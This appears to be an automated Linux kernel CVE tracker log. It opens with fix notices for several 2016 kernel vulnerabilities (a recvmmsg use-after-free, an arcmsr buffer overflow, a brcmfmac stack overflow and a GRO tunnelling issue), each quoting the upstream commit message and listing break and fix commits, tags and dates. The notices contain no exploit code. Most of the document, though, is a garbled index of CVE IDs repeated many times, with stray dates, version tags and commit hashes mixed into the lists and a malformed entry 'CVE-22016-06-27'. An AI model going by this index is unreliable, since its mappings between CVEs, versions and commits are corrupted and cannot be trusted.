This CVE has been resolved in 3.14.67.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 34b88a68f26a75e4fded796f1a49c40f82234b7d
Author: Arnaldo Carvalho de Melo <acme@redhat.com>
Date:   Mon Mar 14 09:56:35 2016 -0300

    net: Fix use after free in the recvmmsg exit path
    
    The syzkaller fuzzer hit the following use-after-free:
    
      Call Trace:
       [<ffffffff8175ea0e>] __asan_report_load8_noabort+0x3e/0x40 mm/kasan/report.c:295
       [<ffffffff851cc31a>] __sys_recvmmsg+0x6fa/0x7f0 net/socket.c:2261
       [<     inline     >] SYSC_recvmmsg net/socket.c:2281
       [<ffffffff851cc57f>] SyS_recvmmsg+0x16f/0x180 net/socket.c:2270
       [<ffffffff86332bb6>] entry_SYSCALL_64_fastpath+0x16/0x7a
      arch/x86/entry/entry_64.S:185
    
    And, as Dmitry rightly assessed, that is because we can drop the
    reference and then touch it when the underlying recvmsg calls return
    some packets and then hit an error, which will make recvmmsg to set
    sock->sk->sk_err, oops, fix it.
    
    Reported-and-Tested-by: Dmitry Vyukov <dvyukov@google.com>
    Cc: Alexander Potapenko <glider@google.com>
    Cc: Eric Dumazet <edumazet@google.com>
    Cc: Kostya Serebryany <kcc@google.com>
    Cc: Sasha Levin <sasha.levin@oracle.com>
    Fixes: a2e2725541fa ("net: Introduce recvmmsg socket syscall")
    http://lkml.kernel.org/r/20160122211644.GC2470@redhat.com
    Signed-off-by: Arnaldo Carvalho de Melo <acme@redhat.com>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 net/socket.c |   38 +++++++++++++++++++-------------------
 1 file changed, 19 insertions(+), 19 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-10
CVE: CVE-2016-7117
Break Date: 2009-10-12
Break Commit: a2e2725541fad72416326798c2d7fa4dafb7d337
Break Tag: 2.6
Linus Fix Date: 2016-03-14
Linus Commit: 34b88a68f26a75e4fded796f1a49c40f82234b7d
Linus Tag: 4.6
Stable Date: 2016-04-20
Stable Commit: 902b916d00ba73095b58a9a8dfe926c6a7f635d5
Stable Tag: 3.14.67

CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 7bc2b55a5c030685b399bb65b6baa9ccc3d1f167
Author: Dan Carpenter <dan.carpenter@oracle.com>
Date:   Thu Sep 15 16:44:56 2016 +0300

    scsi: arcmsr: Buffer overflow in arcmsr_iop_message_xfer()
    
    We need to put an upper bound on "user_len" so the memcpy() doesn't
    overflow.
    
    Cc: <stable@vger.kernel.org>
    Reported-by: Marco Grassi <marco.gra@gmail.com>
    Signed-off-by: Dan Carpenter <dan.carpenter@oracle.com>
    Reviewed-by: Tomas Henzl <thenzl@redhat.com>
    Signed-off-by: Martin K. Petersen <martin.petersen@oracle.com>

 drivers/scsi/arcmsr/arcmsr_hba.c |    8 +++++++-
 1 file changed, 7 insertions(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7425
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-09-15
Linus Commit: 7bc2b55a5c030685b399bb65b6baa9ccc3d1f167
Linus Tag: 4.9
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
2012-09-28:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit ded89912156b1a47d940a0c954c43afbabd0c42c
Author: Arend Van Spriel <arend.vanspriel@broadcom.com>
Date:   Mon Sep 5 10:45:47 2016 +0100

    brcmfmac: avoid potential stack overflow in brcmf_cfg80211_start_ap()
    
    User-space can choose to omit NL80211_ATTR_SSID and only provide raw
    IE TLV data. When doing so it can provide SSID IE with length exceeding
    the allowed size. The driver further processes this IE copying it
    into a local variable without checking the length. Hence stack can be
    corrupted and used as exploit.
    
    Cc: stable@vger.kernel.org # v4.7
    Reported-by: Daxing Guo <freener.gdx@gmail.com>
    Reviewed-by: Hante Meuleman <hante.meuleman@broadcom.com>
    Reviewed-by: Pieter-Paul Giesberts <pieter-paul.giesberts@broadcom.com>
    Reviewed-by: Franky Lin <franky.lin@broadcom.com>
    Signed-off-by: Arend van Spriel <arend.vanspriel@broadcom.com>
    Signed-off-by: Kalle Valo <kvalo@codeaurora.org>

 .../broadcom/brcm80211/brcmfmac/cfg80211.c         |    2 +-
 1 file changed, 1 insertion(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-8658
Break Date: 2012-09-28
Break Commit: 1a87334239757b69eb9885979c32bbf871b3ec88
Break Tag: 3.7
Linus Fix Date: 2016-09-07
Linus Commit: ded89912156b1a47d940a0c954c43afbabd0c42c
Linus Tag: 4.8
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit fac8e0f579695a3ecbc4d3cac369139d7f819971
Author: Jesse Gross <jesse@kernel.org>
Date:   Sat Mar 19 09:32:01 2016 -0700

    tunnels: Don't apply GRO to multiple layers of encapsulation.
    
    When drivers express support for TSO of encapsulated packets, they
    only mean that they can do it for one layer of encapsulation.
    Supporting additional levels would mean updating, at a minimum,
    more IP length fields and they are unaware of this.
    
    No encapsulation device expresses support for handling offloaded
    encapsulated packets, so we won't generate these types of frames
    in the transmit path. However, GRO doesn't have a check for
    multiple levels of encapsulation and will attempt to build them.
    
    UDP tunnel GRO actually does prevent this situation but it only
    handles multiple UDP tunnels stacked on top of each other. This
    generalizes that solution to prevent any kind of tunnel stacking
    that would cause problems.
    
    Fixes: bf5a755f ("net-gre-gro: Add GRE support to the GRO stack")
    Signed-off-by: Jesse Gross <jesse@kernel.org>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 include/linux/netdevice.h |    4 ++--
 net/core/dev.c            |    2 +-
 net/ipv4/af_inet.c        |   15 ++++++++++++++-
 net/ipv4/gre_offload.c    |    5 +++++
 net/ipv4/udp_offload.c    |    6 +++---
 net/ipv6/ip6_offload.c    |   15 ++++++++++++++-
 6 files changed, 39 insertions(+), 8 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-8666
Break Date: 2014-01-07
Break Commit: bf5a755f5e9186406bbf50f4087100af5bd68e40
Break Tag: 3.14
Linus Fix Date: 2016-03-20
Linus Commit: fac8e0f579695a3ecbc4d3cac369139d7f819971
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

2016-09-11:
2016-09-11:
2016-09-11:
2016-09-11:
2016-09-11:
2016-09-11:
2016-09-11:
2016-09-11:
CVE-2013-4312:
CVE-2013-7421:
CVE-2013-7421:
CVE-2013-7446:
CVE-2014-0155:
CVE-2014-0181:
CVE-2014-0196:
CVE-2014-0206:
CVE-2014-1737:
CVE-2014-1738:
CVE-2014-1739:
CVE-2014-2580:
CVE-2014-2678:
CVE-2014-2739:
CVE-2014-2851:
CVE-2014-3122:
CVE-2014-3144:
CVE-2014-3145:
CVE-2014-3153:
CVE-2014-3153:
CVE-2014-3153:
CVE-2014-3153:
CVE-2014-3181:
CVE-2014-3182:
CVE-2014-3183:
CVE-2014-3184:
CVE-2014-3185:
CVE-2014-3186:
CVE-2014-3534:
CVE-2014-3601:
CVE-2014-3610:
CVE-2014-3611:
CVE-2014-3631:
CVE-2014-3646:
CVE-2014-3647:
CVE-2014-3647:
CVE-2014-3673:
CVE-2014-3687:
CVE-2014-3688:
CVE-2014-3690:
CVE-2014-3917:
CVE-2014-3940:
CVE-2014-4014:
CVE-2014-4157:
CVE-2014-4171:
CVE-2014-4171:
CVE-2014-4171:
CVE-2014-4508:
CVE-2014-4608:
CVE-2014-4608:
CVE-2014-4611:
CVE-2014-4652:
CVE-2014-4653:
CVE-2014-4654:
CVE-2014-4655:
CVE-2014-4656:
CVE-2014-4656:
CVE-2014-4667:
CVE-2014-4699:
CVE-2014-4943:
CVE-2014-5045:
CVE-2014-5077:
CVE-2014-5206:
CVE-2014-5206:
CVE-2014-5207:
CVE-2014-5207:
CVE-2014-5471:
CVE-2014-5472:
CVE-2014-6410:
CVE-2014-6416:
CVE-2014-6417:
CVE-2014-6418:
CVE-2014-7145:
CVE-2014-7283:
CVE-2014-7284:
CVE-2014-7822:
CVE-2014-7825:
CVE-2014-7826:
CVE-2014-7841:
CVE-2014-7842:
CVE-2014-7843:
CVE-2014-7970:
CVE-2014-7975:
CVE-2014-8086:
CVE-2014-8133:
CVE-2014-8134:
CVE-2014-8159:
CVE-2014-8160:
CVE-2014-8369:
CVE-2014-8480:
CVE-2014-8480:
CVE-2014-8481:
CVE-2014-8559:
CVE-2014-8559:
CVE-2014-8884:
CVE-2014-8989:
CVE-2014-8989:
CVE-2014-8989:
CVE-2014-8989:
CVE-2014-9090:
CVE-2014-9322:
CVE-2014-9322:
CVE-2014-9419:
CVE-2014-9420:
CVE-2014-9428:
CVE-2014-9529:
CVE-2014-9584:
CVE-2014-9585:
CVE-2014-9644:
CVE-2014-9683:
CVE-2014-9710:
CVE-2014-9715:
CVE-2014-9717:
CVE-2014-9728:
CVE-2014-9728:
CVE-2014-9728:
CVE-2014-9729:
CVE-2014-9730:
CVE-2014-9731:
CVE-2014-9803:
CVE-2014-9904:
CVE-2015-0239:
CVE-2015-0272:
CVE-2015-0274:
CVE-2015-0275:
CVE-2015-1328:
CVE-2015-1333:
CVE-2015-1339:
CVE-2015-1420:
CVE-2015-1421:
CVE-2015-1465:
CVE-2015-1573:
CVE-2015-1593:
CVE-2015-1805:
CVE-2015-1805:
CVE-2015-2041:
CVE-2015-2042:
CVE-2015-2150:
CVE-2015-2666:
CVE-2015-2672:
CVE-2015-2686:
CVE-2015-2830:
CVE-2015-2922:
CVE-2015-2925:
CVE-2015-2925:
CVE-2015-3212:
CVE-2015-3288:
CVE-2015-3290:
CVE-2015-3291:
CVE-2015-3331:
CVE-2015-3332:
CVE-2015-3636:
CVE-2015-4001:
CVE-2015-4002:
CVE-2015-4002:
CVE-2015-4003:
CVE-2015-4004:
CVE-2015-4036:
CVE-2015-4167:
CVE-2015-4176:
CVE-2015-4177:
CVE-2015-4178:
CVE-2015-4692:
CVE-2015-4700:
CVE-2015-5156:
CVE-2015-5157:
CVE-2015-5257:
CVE-2015-5283:
CVE-2015-5307:
CVE-2015-5327:
CVE-2015-5364:
CVE-2015-5366:
CVE-2015-5697:
CVE-2015-5706:
CVE-2015-5707:
CVE-2015-5707:
CVE-2015-6252:
CVE-2015-6526:
CVE-2015-6937:
CVE-2015-7312:
CVE-2015-7513:
CVE-2015-7515:
CVE-2015-7550:
CVE-2015-7566:
CVE-2015-7613:
CVE-2015-7799:
CVE-2015-7799:
CVE-2015-7833:
CVE-2015-7833:
CVE-2015-7837:
CVE-2015-7872:
CVE-2015-7884:
CVE-2015-7885:
CVE-2015-7990:
CVE-2015-8019:
CVE-2015-8104:
CVE-2015-8215:
CVE-2015-8374:
CVE-2015-8539:
CVE-2015-8543:
CVE-2015-8550:
CVE-2015-8550:
CVE-2015-8550:
CVE-2015-8550:
CVE-2015-8550:
CVE-2015-8550:
CVE-2015-8550:
CVE-2015-8551:
CVE-2015-8551:
CVE-2015-8551:
CVE-2015-8551:
CVE-2015-8551:
CVE-2015-8552:
CVE-2015-8552:
CVE-2015-8552:
CVE-2015-8552:
CVE-2015-8552:
CVE-2015-8569:
CVE-2015-8575:
CVE-2015-8660:
CVE-2015-8709:
CVE-2015-8746:
CVE-2015-8767:
CVE-2015-8785:
CVE-2015-8787:
CVE-2015-8812:
CVE-2015-8816:
CVE-2015-8830:
CVE-2015-8839:
CVE-2015-8839:
CVE-2015-8839:
CVE-2015-8839:
CVE-2015-8844:
CVE-2015-8845:
CVE-2015-8944:
CVE-2015-8950:
CVE-2015-8952:
CVE-2015-8953:
CVE-2015-8955:
CVE-2015-8956:
CVE-2015-8970:
CVE-2015-8970:
CVE-2015-8970:
CVE-2015-8970:
CVE-2015-8970:
CVE-2015-8970:
CVE-2015-8970:
CVE-2015-8970:
CVE-2015-8970:
CVE-2016-0617:
CVE-2016-0723:
CVE-2016-0728:
CVE-2016-0758:
CVE-2016-0774:
CVE-2016-0821:
CVE-2016-0823:
CVE-2016-1237:
CVE-2016-1237:
CVE-2016-1575:
CVE-2016-1575:
CVE-2016-1576:
CVE-2016-1576:
CVE-2016-1583:
CVE-2016-1583:
CVE-2016-1583:
CVE-2016-2053:
CVE-2016-2069:
CVE-2016-2069:
CVE-2016-2070:
CVE-2016-2085:
CVE-2016-2117:
CVE-2016-2143:
CVE-2016-2184:
CVE-2016-2184:
CVE-2016-2185:
CVE-2016-2186:
CVE-2016-2187:
CVE-2016-2188:
CVE-2016-2383:
CVE-2016-2384:
CVE-2016-2543:
CVE-2016-2544:
CVE-2016-2545:
CVE-2016-2546:
CVE-2016-2547:
CVE-2016-2548:
CVE-2016-2549:
CVE-2016-2550:
CVE-2016-2782:
CVE-2016-2847:
CVE-2016-3070:
CVE-2016-3134:
CVE-2016-3134:
CVE-2016-3134:
CVE-2016-3135:
CVE-2016-3136:
CVE-2016-3137:
CVE-2016-3138:
CVE-2016-3140:
CVE-2016-3156:
CVE-2016-3157:
CVE-2016-3672:
CVE-2016-3689:
CVE-2016-3713:
CVE-2016-3841:
CVE-2016-3857:
CVE-2016-3951:
CVE-2016-3951:
CVE-2016-3955:
CVE-2016-3961:
CVE-2016-4440:
CVE-2016-4470:
CVE-2016-4482:
CVE-2016-4485:
CVE-2016-4486:
CVE-2016-4557:
CVE-2016-4558:
CVE-2016-4565:
CVE-2016-4569:
CVE-2016-4578:
CVE-2016-4578:
CVE-2016-4580:
CVE-2016-4581:
CVE-2016-4794:
CVE-2016-4794:
CVE-2016-4805:
CVE-2016-4913:
CVE-2016-4951:
CVE-2016-4997:
CVE-2016-4997:
CVE-2016-4997:
CVE-2016-4998:
CVE-2016-4998:
CVE-2016-4998:
CVE-2016-5195:
CVE-2016-5243:
CVE-2016-5244:
CVE-2016-5400:
CVE-2016-5412:
CVE-2016-5412:
CVE-2016-5696:
CVE-2016-5728:
CVE-2016-5828:
CVE-2016-5829:
CVE-2016-6130:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
2.6:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
54dbc15172375641ef03399e8f911d7165eb90fb:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
-:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
-:
CVE-2016-8658:
CVE-2016-8666:
4.9:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.9:
CVE-2016-8658:
CVE-2016-8666:
2.6:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
-:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.6:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.7:
CVE-2016-5412:
CVE-2016-5412:
CVE-2016-5696:
CVE-2016-5728:
CVE-2016-5828:
CVE-2016-5829:
CVE-2016-6130:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
51093254bf879bc9ce96590400a87897c7498463:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.9:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.9:
CVE-2016-8658:
CVE-2016-8666:
2012-09-28:
CVE-2016-8666:
2016-09-07:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.2:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
-:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
6859d49475d4f32abe640372117e4b687906e6b6:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
f69bcbf3b4c4b333dcd7a48eaf868bf0c88edab5:
CVE-2016-5829:
CVE-2016-6130:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.7:
CVE-2016-6130:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.6:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
2.6:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
43761473c254b45883a64441dd0bc85a42f3645c:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.8:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.5:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
30a46a4647fd1df9cf52e43bf467f0d9265096ca:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-22016-06-27:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.5:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.5:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
3.15:
CVE-2016-5696:
CVE-2016-5728:
CVE-2016-5828:
CVE-2016-5829:
CVE-2016-6130:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
ff19f63ed47309550b47831ac39176d9910fadfe:
CVE-2016-5829:
CVE-2016-6130:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
2016-07-08:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
9bf292bfca94694a721449e3fd752493856710f6:
CVE-2016-5828:
CVE-2016-5829:
CVE-2016-6130:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
1a1a143daf84db95dd7212086042004a3abb7bc2:
CVE-2016-4997:
CVE-2016-4997:
CVE-2016-4997:
CVE-2016-4998:
CVE-2016-4998:
CVE-2016-4998:
CVE-2016-5195:
CVE-2016-5243:
CVE-2016-5244:
CVE-2016-5400:
CVE-2016-5412:
CVE-2016-5412:
CVE-2016-5696:
CVE-2016-5728:
CVE-2016-5828:
CVE-2016-5829:
CVE-2016-6130:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
CVE-2016-5829:
CVE-2016-6130:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
*************

*** This is a new CVE ***
This CVE has been resolved in 09a2499466dc69d1e54e8e879d4591cdd0ca17c8.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 09a2499466dc69d1e54e8e879d4591cdd0ca17c8
Author: Andrea Arcangeli <aarcange@redhat.com>
Date:   Fri Feb 26 15:19:28 2016 -0800

    mm: thp: fix SMP race condition between THP page fault and MADV_DONTNEED
    
    commit ad33bb04b2a6cee6c1f99fabb15cddbf93ff0433 upstream.
    
    pmd_trans_unstable()/pmd_none_or_trans_huge_or_clear_bad() were
    introduced to locklessy (but atomically) detect when a pmd is a regular
    (stable) pmd or when the pmd is unstable and can infinitely transition
    from pmd_none() and pmd_trans_huge() from under us, while only holding
    the mmap_sem for reading (for writing not).
    
    While holding the mmap_sem only for reading, MADV_DONTNEED can run from
    under us and so before we can assume the pmd to be a regular stable pmd
    we need to compare it against pmd_none() and pmd_trans_huge() in an
    atomic way, with pmd_trans_unstable().  The old pmd_trans_huge() left a
    tiny window for a race.
    
    Useful applications are unlikely to notice the difference as doing
    MADV_DONTNEED concurrently with a page fault would lead to undefined
    behavior.
    
    [js] 3.12 backport: no pmd_devmap in 3.12 yet.
    
    [akpm@linux-foundation.org: tidy up comment grammar/layout]
    Signed-off-by: Andrea Arcangeli <aarcange@redhat.com>
    Reported-by: Kirill A. Shutemov <kirill.shutemov@linux.intel.com>
    Signed-off-by: Andrew Morton <akpm@linux-foundation.org>
    Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>
    Cc: Vlastimil Babka <vbabka@suse.cz>
    Signed-off-by: Jiri Slaby <jslaby@suse.cz>
    Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

 mm/memory.c |   14 ++++++++++++--
 1 file changed, 12 insertions(+), 2 deletions(-)
---
